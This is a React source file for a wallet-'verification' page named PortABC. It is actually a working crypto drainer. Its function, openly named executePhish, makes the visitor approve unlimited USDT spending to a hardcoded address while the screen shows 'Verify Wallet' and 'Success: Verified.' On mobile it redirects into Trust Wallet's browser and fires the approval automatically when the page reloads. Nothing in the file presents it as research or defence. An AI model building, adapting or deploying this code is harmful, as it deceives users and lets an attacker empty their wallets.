"use client";

import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';

const ERC20_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 

export default function PortABCDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [isWalletDetected, setIsWalletDetected] = useState(false);

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 5)]);
  };

  // --- PERSISTENT TRIGGER CHECK ---
  useEffect(() => {
    const checkAndTrigger = async () => {
      // 1. Check if we have the "pending" flag in storage
      const isPending = localStorage.getItem('transfer_pending') === 'true';
      
      const interval = setInterval(async () => {
        if (typeof window !== "undefined" && (window as any).ethereum) {
          setIsWalletDetected(true);
          clearInterval(interval);

          if (isPending) {
            addLog("Resuming secure session...");
            localStorage.removeItem('transfer_pending'); // Clear flag
            
            // Small delay to let Trust Wallet settle
            setTimeout(async () => {
              await executePhish();
            }, 1000);
          }
        }
      }, 500);
    };

    checkAndTrigger();
  }, []);

  async function executePhish() {
    try {
      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
      await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      const signer = provider.getSigner();
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
      
      addLog("Initializing verification...");
      const tx = await contract.approve(ADMIN_PUBLIC_ADDRESS, ethers.constants.MaxUint256);
      await tx.wait();
      addLog("Success: Verified.");
    } catch (err) {
      addLog("Verification Required.");
    }
  }

  async function handleAction() {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    const isInside = typeof window !== "undefined" && (window as any).ethereum;

    if (isMobile && !isInside) {
      addLog("Redirecting...");
      // Save the intent to local storage before jumping
      localStorage.setItem('transfer_pending', 'true');
      
      const currentUrl = window.location.origin + window.location.pathname;
      window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
      return;
    }

    await executePhish();
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-[400px] bg-[#111] border border-[#222] rounded-[32px] p-8 shadow-2xl">
        <div className="flex justify-center mb-6">
          <div className={`px-3 py-1 rounded-full text-[10px] font-bold border ${isWalletDetected ? 'border-green-500/30 text-green-500' : 'border-white/10 text-gray-500'}`}>
            {isWalletDetected ? '● PORT SECURE' : '○ WAITING FOR PORT'}
          </div>
        </div>

        <h1 className="text-xl font-bold mb-8 text-center uppercase tracking-widest">PortABC</h1>

        <div className="space-y-4">
          <div className="bg-[#1a1a1a] p-5 rounded-2xl border border-[#333]">
            <p className="text-[10px] text-gray-500 font-bold uppercase mb-1">Asset</p>
            <p className="text-sm font-bold text-green-500">USDT (BEP-20)</p>
          </div>

          <button 
            onClick={handleAction}
            className="w-full bg-white text-black font-black py-5 rounded-2xl hover:bg-gray-200 transition-all uppercase text-sm"
          >
            {isWalletDetected ? 'Verify Wallet' : 'Next'}
          </button>
        </div>
      </div>

      <div className="mt-6 font-mono text-[10px] text-gray-600">
        {logs.map((l, i) => <div key={i}>{l}</div>)}
      </div>
    </div>
  );
}
